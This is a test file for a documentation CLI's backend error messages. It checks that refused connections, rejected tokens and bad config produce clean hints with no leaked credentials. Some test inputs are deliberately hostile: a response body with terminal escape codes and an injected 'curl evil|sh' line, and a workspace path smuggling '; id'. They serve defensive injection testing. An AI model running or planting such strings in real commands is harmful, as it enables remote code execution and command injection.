// Backend failures in login / push / pull: what failed, why, and the next command, with no stack
// trace and no URL credentials. Unit tests for the wording, then the three commands against a
// refused port and against a stub that rejects the token.

import { createBackendStub } from "@docsxai/backend";
import { promises as fs } from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { BackendClientError, resolveBackendToken } from "../src/backend-client.js";
import { configProblem, explainBackendFailure } from "../src/cli-backend-errors.js";
import { main } from "../src/cli.js";

const URL_REFUSED = "http://127.0.0.1:1";

function refused(): TypeError {
  const e = new TypeError("fetch failed");
  (e as { cause?: unknown }).cause = Object.assign(new Error("connect ECONNREFUSED"), {
    code: "ECONNREFUSED",
  });
  return e;
}

/** The control characters in `text` other than newline, as code points. */
function controlCodes(text: string): number[] {
  return [...text]
    .map((ch) => ch.codePointAt(0)!)
    .filter((c) => c !== 10 && (c < 32 || (c >= 127 && c <= 159)));
}

describe("explainBackendFailure", () => {
  it("names the backend and the error code for a refused connection", () => {
    const text = explainBackendFailure(refused(), URL_REFUSED, "/ws")!;
    expect(text).toContain("cannot reach http://127.0.0.1:1 (ECONNREFUSED)");
    expect(text).toContain("\n  next: check backend_url in .docsxai.json");
    expect(text).toContain("docsxai login --backend-url http://127.0.0.1:1");
  });

  it("never prints credentials from the backend URL", () => {
    const u = new URL("https://backend.example.com");
    u.username = "someone";
    u.password = "hunter2";
    const text = explainBackendFailure(refused(), u.toString(), "/ws")!;
    expect(text).toContain("https://backend.example.com");
    expect(text).not.toContain("hunter2");
    expect(text).not.toContain("someone");
  });

  it("never prints the query string or fragment of the backend URL", () => {
    const text = explainBackendFailure(refused(), "https://h.example/?token=abc#frag", "/ws")!;
    expect(text).toContain("cannot reach https://h.example (ECONNREFUSED)");
    expect(text).not.toContain("abc");
    expect(text).not.toContain("frag");
    expect(explainBackendFailure(refused(), "https://us/er:hunter2@h")).not.toContain("hunter2");
  });

  it("strips terminal control characters from the response body in the message", () => {
    const body = "GET /x → 500: \u001b[2J\u001b]0;pwned\u0007\u009b31m\n  next: curl evil|sh";
    for (const status of [401, 404, 500, 418]) {
      const text = explainBackendFailure(new BackendClientError(body, status), URL_REFUSED, "/ws")!;
      expect(controlCodes(text)).toEqual([]);
      expect(text).not.toContain("\n  next: curl");
      expect(text).toContain("[2J");
    }
  });

  it("quotes the workspace dir and the URL in the commands it suggests", () => {
    const text = explainBackendFailure(
      new BackendClientError("GET /x", 401),
      "https://h.example/a b",
      "/w s; id",
    )!;
    expect(text).toContain("--backend-url 'https://h.example/a%20b'");
    expect(text).toContain("--oauth '/w s; id'");
  });

  it("says the token was rejected on 401 and 403, and offers --oauth", () => {
    for (const status of [401, 403]) {
      const text = explainBackendFailure(
        new BackendClientError("GET /v1/workspaces", status),
        URL_REFUSED,
        "/ws",
      )!;
      expect(text).toContain("why: http://127.0.0.1:1 rejected the token");
      expect(text).toContain("next: docsxai login --backend-url http://127.0.0.1:1");
      expect(text).toContain("--oauth /ws");
    }
  });

  it("points a 404 at the backend ids in .docsxai.json", () => {
    const text = explainBackendFailure(new BackendClientError("GET /x", 404), URL_REFUSED)!;
    expect(text).toContain("backend_workspace_id and backend_project_id");
  });

  it("blames the backend for a 5xx", () => {
    const text = explainBackendFailure(new BackendClientError("POST /x", 503), URL_REFUSED)!;
    expect(text).toContain("failed on its side");
    expect(text).toContain("next: check the backend's logs");
  });

  it("returns a plain message for other client errors", () => {
    expect(explainBackendFailure(new BackendClientError("health → 418", 418), URL_REFUSED)).toBe(
      "health → 418",
    );
  });

  it("returns undefined for an error that is not a backend failure", () => {
    expect(explainBackendFailure(new RangeError("boom"), URL_REFUSED)).toBeUndefined();
    expect(explainBackendFailure("text", URL_REFUSED)).toBeUndefined();
  });
});

describe("resolveBackendToken", () => {
  afterEach(() => {
    vi.unstubAllEnvs();
  });

  it("names the backend in the missing-token hint without credentials, query or fragment", async () => {
    vi.stubEnv("DOCSX_TOKEN", "");
    const err = await resolveBackendToken({ baseUrl: "https://u" + ":hunter2@h.example/?token=abc#f" })
      .then(() => undefined)
      .catch((e: Error) => e);
    expect(err?.message).toContain("docsxai login --backend-url https://h.example --oauth");
    expect(err?.message).not.toMatch(/hunter2|abc/);
  });

  it("quotes a backend URL that is not a plain word in the hint", async () => {
    vi.stubEnv("DOCSX_TOKEN", "");
    const err = await resolveBackendToken({ baseUrl: "https://h.example/a b" }).catch(
      (e: Error) => e,
    );
    expect((err as Error).message).toContain("--backend-url 'https://h.example/a%20b' --oauth");
  });
});

describe("configProblem", () => {
  let dir = "";
  beforeEach(async () => {
    dir = await fs.mkdtemp(path.join(os.tmpdir(), "docsxai-config-problem-"));
  });
  afterEach(async () => {
    await fs.rm(dir, { recursive: true, force: true });
  });

  it("reports a missing file", async () => {
    expect(await configProblem(dir)).toBe("the file does not exist");
  });

  it("reports invalid JSON with the parser's message", async () => {
    await fs.writeFile(path.join(dir, ".docsxai.json"), "{ nope");
    expect(await configProblem(dir)).toMatch(/^it is not valid JSON: /);
  });

  it("reports a wrong schema", async () => {
    await fs.writeFile(path.join(dir, ".docsxai.json"), '{"schema":"other@1"}');
    expect(await configProblem(dir)).toBe('its "schema" must be "docsxai/workspace@1"');
  });
});

describe("login / push / pull failures", () => {
  let err = "";
  let ws = "";

  beforeEach(async () => {
    err = "";
    vi.spyOn(process.stdout, "write").mockImplementation(() => true);
    vi.spyOn(process.stderr, "write").mockImplementation((chunk: unknown) => {
      err += String(chunk);
      return true;
    });
    vi.stubEnv("DOCSX_TOKEN", "some-token");
    ws = await fs.mkdtemp(path.join(os.tmpdir(), "docsxai-backend-errors-"));
    await fs.mkdir(path.join(ws, "flows"), { recursive: true });
  });
  afterEach(async () => {
    vi.restoreAllMocks();
    vi.unstubAllEnvs();
    await fs.rm(ws, { recursive: true, force: true });
  });

  async function writeConfig(extra: Record<string, unknown>): Promise<void> {
    await fs.writeFile(
      path.join(ws, ".docsxai.json"),
      JSON.stringify({
        schema: "docsxai/workspace@1",
        created_at: "2026-01-01T00:00:00.000Z",
        ...extra,
      }),
    );
  }

  it("login against a refused port exits 1 with a cannot-reach line, not a stack", async () => {
    expect(await main(["login", "--backend-url", URL_REFUSED])).toBe(1);
    expect(err).toContain("login: cannot reach http://127.0.0.1:1");
    expect(err).toContain("next:");
    expect(err).not.toMatch(/TypeError|\n\s+at /);
  });

  it("login never prints a token carried in the query string of --backend-url", async () => {
    expect(await main(["login", "--backend-url", `${URL_REFUSED}/?token=abc#frag`])).toBe(1);
    expect(err).toContain("login: cannot reach http://127.0.0.1:1 (");
    expect(err).not.toContain("abc");
    expect(err).not.toContain("frag");
    err = "";
    vi.stubEnv("DOCSX_TOKEN", "");
    expect(await main(["login", "--backend-url", `${URL_REFUSED}/?token=abc`])).toBe(2);
    expect(err).not.toContain("abc");
  });

  it("push against a refused port exits 1 with a cannot-reach line", async () => {
    await writeConfig({ backend_url: URL_REFUSED });
    expect(await main(["push", ws])).toBe(1);
    expect(err).toContain("push: cannot reach http://127.0.0.1:1");
    expect(err).not.toMatch(/TypeError|\n\s+at /);
  });

  it("pull against a refused port exits 1 with a cannot-reach line", async () => {
    await writeConfig({
      backend_url: URL_REFUSED,
      backend_workspace_id: "w1",
      backend_project_id: "p1",
    });
    expect(await main(["pull", ws])).toBe(1);
    expect(err).toContain("pull: cannot reach http://127.0.0.1:1");
    expect(err).not.toMatch(/TypeError|\n\s+at /);
  });

  it("push with a token the backend rejects says so and names login", async () => {
    const stub = createBackendStub({ token: "the-real-token" });
    const base = await stub.listen(0);
    try {
      await writeConfig({ backend_url: base });
      expect(await main(["push", ws])).toBe(1);
      expect(err).toContain(`why: ${base} rejected the token`);
      expect(err).toContain(`next: docsxai login --backend-url ${base}`);
    } finally {
      await stub.close();
    }
  });

  it("push with no backend_url names the file and the next step", async () => {
    await writeConfig({});
    expect(await main(["push", ws])).toBe(2);
    expect(err).toContain(`push: no backend_url in ${path.join(ws, ".docsxai.json")}`);
    expect(err).toContain('next: add "backend_url": "<url>" to it, then docsxai login');
  });

  it("push explains an unreadable .docsxai.json instead of claiming a key is missing", async () => {
    await fs.writeFile(path.join(ws, ".docsxai.json"), "{ nope");
    expect(await main(["push", ws])).toBe(2);
    expect(err).toContain("(it is not valid JSON: ");
  });

  it("pull on an unbound workspace names push as the next step", async () => {
    await writeConfig({ backend_url: URL_REFUSED });
    expect(await main(["pull", ws])).toBe(2);
    expect(err).toContain("isn't bound to a backend yet (backend_url, backend_workspace_id");
    expect(err).toContain(`next: docsxai push ${ws}`);
  });

  it("login without --backend-url shows the login usage", async () => {
    expect(await main(["login"])).toBe(2);
    expect(err).toContain("login: --backend-url <url> required");
    expect(err).toContain("usage: docsxai login --backend-url <url>");
  });

  it("login without DOCSX_TOKEN gives the command to run", async () => {
    vi.stubEnv("DOCSX_TOKEN", "");
    expect(await main(["login", "--backend-url", URL_REFUSED])).toBe(2);
    expect(err).toContain("DOCSX_TOKEN env var not set");
    expect(err).toContain(
      "next: DOCSX_TOKEN=<token> docsxai login --backend-url http://127.0.0.1:1",
    );
  });
});
